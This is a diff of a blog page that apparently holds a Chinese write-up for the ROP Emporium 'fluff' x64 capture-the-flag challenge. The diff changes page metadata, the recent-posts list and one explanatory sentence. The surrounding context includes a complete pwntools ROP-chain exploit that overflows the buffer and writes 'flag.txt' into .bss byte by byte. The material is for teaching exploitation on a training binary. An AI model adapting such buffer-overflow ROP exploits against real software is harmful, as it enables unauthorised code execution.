@@ -40,7 +40,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/wpimages/2024/ctf/pwn/roprmporium_x64.jpg">
 <meta property="article:published_time" content="2024-05-14T05:45:15.000Z">
-<meta property="article:modified_time" content="2024-05-17T10:38:43.258Z">
+<meta property="article:modified_time" content="2024-05-26T10:15:50.520Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary">
@@ -189,7 +189,7 @@
         
             <a class="category-link" href="/categories/htb-Season-5/">
                 htb-Season-5
-                <div class="category-count">1</div>
+                <div class="category-count">2</div>
             </a>
         
             <a class="category-link" href="/categories/ctf/">
@@ -213,6 +213,12 @@
       <h3 class="widget-title">Recent Posts</h3>
       <ul>
         
+          <a class="recent-link" href="/2024/05/26/box-BoardLight-wp/" title="【season-5】box BoardLight wp" >
+            <div class="recent-link-text">
+              【season-5】box BoardLight wp
+            </div>
+          </a>
+        
           <a class="recent-link" href="/2024/05/18/Tracks-cloud-bucket/" title="Tracks-cloud-bucket" >
             <div class="recent-link-text">
               Tracks-cloud-bucket
@@ -234,12 +240,6 @@
           <a class="recent-link" href="/2024/05/13/Ropemporium-6-x86/" title="Ropemporium-6-x86" >
             <div class="recent-link-text">
               Ropemporium-6-x86
-            </div>
-          </a>
-        
-          <a class="recent-link" href="/2024/04/26/zentao-20240426%E6%9C%AA%E6%8E%88%E6%9D%83-poc/" title="zentao-20240426未授权-poc" >
-            <div class="recent-link-text">
-              zentao-20240426未授权-poc
             </div>
           </a>
         
@@ -331,7 +331,7 @@
 <p>所以需要控制<code>xlat   BYTE PTR ds:[rbx]</code>这里给<code>rax</code>低位（<code>al</code>）传参的是<code>rbx</code>（这里需要注意因为并没有能<code>pop rax</code>清理<code>rax</code>的指令，所以每次计算<code>rbx</code>给<code>al</code>传参都需要减去上一次<code>al</code>的偏移,去掉去第一次<code>al</code>默认的<code>0xb</code>，后面每一次<code>al</code>都是上一个字符，所以除第一次减<code>0xb</code>之外每次都需要<code>rbx - flag[上一个的位] - 0x3ef2</code>）</p>
 <p>再去找<code>rbx</code>就找到了<code>bextr rbx,rcx,rdx</code> 。</p>
 <p>要给<code>rbx</code>传参就要控制<code>rcx</code>和<code>rdx</code>这俩，由于会<code>rcx</code>给加<code>0x3ef2</code>所以直接写字符给<code>rcx</code>过去会被破坏掉，指定是不行了。</p>
-<p>于是用这个程序地址中的就字符ok。</p>
+<p>于是直接从这个程序中找能用的字符所在的地址，直接拿现成的来用就ok。</p>
 <p>exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;fluff&#x27;</span>) </span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line">p=gdb.debug(<span class="string">&#x27;./fluff&#x27;</span>,<span class="string">&quot;b pwnme&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag=<span class="string">b&#x27;flag.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x00601038</span></span><br><span class="line"></span><br><span class="line">pop_rdx_rcx_add_bextr=<span class="number">0x040062a</span></span><br><span class="line"></span><br><span class="line">xlat_al_rbx=<span class="number">0x0400628</span></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x04006a3</span></span><br><span class="line"></span><br><span class="line">stosb_rdi_al=<span class="number">0x0400639</span></span><br><span class="line"></span><br><span class="line">print_file=<span class="number">0x00400510</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">40</span></span><br><span class="line"></span><br><span class="line">mask=p64(<span class="number">0x2300</span>)</span><br><span class="line"></span><br><span class="line">tmemaddress=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">	tmemaddress.append(<span class="built_in">hex</span>(read(<span class="string">&#x27;./fluff&#x27;</span>).find(flag[i])+elf.address))</span><br><span class="line"><span class="built_in">print</span>(tmemaddress)</span><br><span class="line"></span><br><span class="line">al=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">	payload+=p64(pop_rdx_rcx_add_bextr)+mask</span><br><span class="line">	<span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">		al=<span class="number">0xb</span></span><br><span class="line">	<span class="keyword">elif</span> i&gt;<span class="number">0</span>:</span><br><span class="line">		al=flag[i-<span class="number">1</span>]</span><br><span class="line">	payload+=p64(<span class="built_in">int</span>(tmemaddress[i],<span class="number">16</span>) - al - <span class="number">0x3ef2</span>)</span><br><span class="line">	payload+=p64(xlat_al_rbx)</span><br><span class="line">	payload+=p64(pop_rdi) + p64(bss+i)</span><br><span class="line">	payload+=p64(stosb_rdi_al)</span><br><span class="line">payload+=p64(pop_rdi)+p64(bss)+p64(print_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
         
